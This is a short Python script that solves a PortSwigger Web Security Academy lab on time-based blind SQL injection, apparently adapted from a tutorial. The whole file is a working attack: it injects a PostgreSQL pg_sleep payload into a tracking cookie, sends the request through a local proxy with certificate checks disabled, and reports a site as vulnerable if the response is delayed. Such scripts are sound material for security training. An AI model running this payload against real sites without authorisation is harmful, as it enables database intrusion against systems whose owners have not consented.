# PortSwigger's Web Security Academy Lab 13 - Blind SQL injection with time delays
# Original code provided by Rana Khalil - https://www.youtube.com/watch?v=vhDhB9uVbGA&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf

import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'} #old URLLIB3 syntax?

proxies = {'https': 'http://127.0.0.1:8080'} #New syntax for URLLIB3

def blind_sqli_check(url,trackingId,sessionId):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': trackingId + sqli_payload_encoded, 'session': sessionId} #copy in cookie value and session value
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds() > 10):
        print("[+] Vulnerable to time-based blind SQLi")
    else:
        print("[+] Not vulnerable to time-based blind SQLi")

def main():
    if len(sys.argv) != 4:
        print("[+] Usage: %s <url> <TrackingId> <SessionId>" % sys.argv[0])
        print("[+] Example: %s \"www.example.com\" \"EKxYesbVHdCVRm2J\" \"BYpIVM1tCjE5ITYHNijuyY62svZkTaWW\"" % sys.argv[0])
        exit()
    url = sys.argv[1]
    trackingId = sys.argv[2]
    sessionId = sys.argv[3]
    print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi....")
    blind_sqli_check(url,trackingId,sessionId)

if __name__ == "__main__":
    main()